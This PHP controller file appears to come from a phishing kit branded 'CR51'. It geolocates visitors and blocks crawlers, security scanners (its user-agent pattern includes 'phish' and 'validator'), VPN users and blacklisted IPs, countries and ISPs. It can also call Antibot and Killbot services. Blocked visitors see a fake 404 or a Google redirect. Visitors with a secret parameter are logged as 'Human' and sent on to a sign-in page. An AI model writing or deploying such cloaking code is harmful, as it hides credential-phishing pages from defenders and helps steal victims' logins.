<?php
defined("ALLOW") or exit('No direct script access allowed');

class Home
{
	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();
		$getInfo = _geoGet($this->goCR51->ip_address);

		foreach ($getInfo as $k => $v) {
			$_SESSION[$k] = $v;
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{

		if (preg_match("/bot|crawler|spider|aws|curl|slurp|phish|search|libwww-perl|python|archiver|transcoder|spider|uptime|validator|fetcher|cron|check|reader|extractor|monitoring|analyz/", $_SERVER['HTTP_USER_AGENT'])) {
			if (_config('NOTFOUND') == '404') {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				die;
			} else if (_config('NOTFOUND') == 'custom') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?" . _redirect('Redirect'));
				die;
			} else if (_config('NOTFOUND') == 'google') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?https://www.google.com");
				die;
			} else {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
			}
		}

		if (_config('VPNDETECT') == 'on') {
			if (blackbox($this->goCR51->ip_address)) {
				if (_config('NOTFOUND') == '404') {
					_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
					write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED VPN BY CR51 NETWORK\r\n");
					die;
				} else if (_config('NOTFOUND') == 'custom') {
					write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED VPN BY CR51 NETWORK\r\n");
					header("Location: https://href.li/?" . _redirect('Redirect'));
					die;
				} else if (_config('NOTFOUND') == 'google') {
					write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED VPN BY CR51 NETWORK\r\n");
					header("Location: https://href.li/?https://www.google.com");
					die;
				} else {
					_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
				}
			}
		}

		if ($this->goCR51->is_robot) {
			if (_config('NOTFOUND') == '404') {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				die;
			} else if (_config('NOTFOUND') == 'custom') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?" . _redirect('Redirect'));
				die;
			} else if (_config('NOTFOUND') == 'google') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?https://www.google.com");
				die;
			} else {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
			}
		}
		if (isset($_GET["panel"])) {
			redirect(base_url() . 'panel/login');
		}

		if (!isset($_GET[_config('PARAMETER')])) {
			if (_config('NOTFOUND') == '404') {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				die;
			} else if (_config('NOTFOUND') == 'custom') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?" . _redirect('Redirect'));
				die;
			} else if (_config('NOTFOUND') == 'google') {
				write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED SYSTEM BY CR51 NETWORK\r\n");
				header("Location: https://href.li/?https://www.google.com");
				die;
			} else {
				_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
			}
		}

		if (_config('ANTIBOT') == 'on') {
			if (!empty(_antibot('KEY'))) {
				if (antibot($this->goCR51->ip_address, $this->goCR51->agent)) {
					if (_config('NOTFOUND') == '404') {
						_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY ANTIBOT\r\n");
						die;
					} else if (_config('NOTFOUND') == 'custom') {
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY ANTIBOT\r\n");
						header("Location: https://href.li/?" . _redirect('Redirect'));
						die;
					} else if (_config('NOTFOUND') == 'google') {
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY ANTIBOT\r\n");
						header("Location: https://href.li/?https://www.google.com");
						die;
					} else {
						_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
					}
				}
			}
		}

		if (_config('KILLBOT') == 'on') {
			if (!empty(_killbot('KEY'))) {
				if (killbot($this->goCR51->ip_address, $this->goCR51->agent)) {
					if (_config('NOTFOUND') == '404') {
						_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY KILLBOT\r\n");
						die;
					} else if (_config('NOTFOUND') == 'custom') {
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY KILLBOT\r\n");
						header("Location: https://href.li/?" . _redirect('Redirect'));
						die;
					} else if (_config('NOTFOUND') == 'google') {
						write('CR51/Static/log_robot.txt', 'a', "{$this->goCR51->ip_address}|BLOCKED BY KILLBOT\r\n");
						header("Location: https://href.li/?https://www.google.com");
						die;
					} else {
						_404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
					}
				}
			}
		}

		$_SESSION['access'] = 1;
		write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|Human\r\n");
		redirect(base_url() . 'signin?verify=cr51_' . md5(time()) . '');
	}
}
